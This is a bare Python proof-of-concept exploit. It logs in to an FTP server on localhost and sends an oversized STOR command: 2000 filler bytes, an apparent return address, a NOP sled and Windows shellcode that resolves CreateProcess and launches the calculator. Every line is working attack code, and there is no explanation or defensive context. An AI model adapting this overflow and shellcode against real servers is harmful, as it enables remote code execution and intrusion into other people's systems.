import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer='\x41' *2000
buffer2='\x90' *50
sc="\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"

sc+="\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"

sc+="\x77\x20\x8b\x3f\x80\x7e\x0c\x33"

sc+="\x75\xf2\x89\xc7\x03\x78\x3c\x8b"

sc+="\x57\x78\x01\xc2\x8b\x7a\x20\x01"

sc+="\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"

sc+="\x45\x81\x3e\x43\x72\x65\x61\x75"

sc+="\xf2\x81\x7e\x08\x6f\x63\x65\x73"

sc+="\x75\xe9\x8b\x7a\x24\x01\xc7\x66"

sc+="\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"

sc+="\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"

sc+="\xb1\xff\x53\xe2\xfd\x68\x63\x61"

sc+="\x6c\x63\x89\xe2\x52\x52\x53\x53"

sc+="\x53\x53\x53\x53\x52\x53\xff\xd7"

print("\Sending buffeer")
s.connect(('localhost',21))
data=s.recv(1024)
s.send('USER genki'+'\r\n')
data=s.recv(1024)
s.send('PASS genki'+'\r\n')
data=s.recv(1024)
s.send('STOR' +buffer+ '\x58' + '\x59' + '\xBB'+'\x77'+buffer2+sc+ '\r\n')
s.close()
